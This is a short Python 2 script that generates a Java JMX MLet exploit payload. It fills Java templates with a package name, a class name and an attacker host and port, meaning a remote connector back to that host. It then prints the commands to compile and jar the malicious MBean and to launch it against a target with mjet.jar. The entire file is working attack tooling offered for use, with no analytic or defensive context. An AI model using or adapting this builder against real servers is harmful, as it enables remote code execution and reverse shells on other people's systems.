#!/usr/bin/env python
#coding=utf-8

import os
import sys

archive,pkgname,clsname,rhost,rport = sys.argv[1:6]
print 'archive:%s,package:%s,class:%s,rhost:%s,rport:%s' % (archive,pkgname,clsname,rhost,rport)

open('Payload.java','wb').write(open('__Payload__.java').read().replace('__PACKAGE__',pkgname).replace('__RHOST__',rhost).replace('__RPORT__',rport))
open('%s.java'%(clsname),'wb').write(open('__CLASS__.java').read().replace('__PACKAGE__',pkgname).replace('__CLASS__',clsname))
open('%sMBean.java'%(clsname),'wb').write(open('__CLASS__MBean.java').read().replace('__PACKAGE__',pkgname).replace('__CLASS__',clsname))
open('%s.mlet.txt'%(clsname),'wb').write(open('__MLET__.txt').read().replace('__ARCHIVE__',archive).replace('__CLASS__',clsname))
print '\n* * * * \n'
print 'cmd1: javac -cp . -encoding UTF-8 StreamConnector.java Payload.java %s.java %sMBean.java' % (clsname,clsname)
print 'cmd2: jar cf %s StreamConnector.class Payload.class %s.class %sMBean.class' % (archive,clsname,clsname)
print 'cmd3: java -jar mjet.jar -t TARGET -p PORT -u MLET_URL'
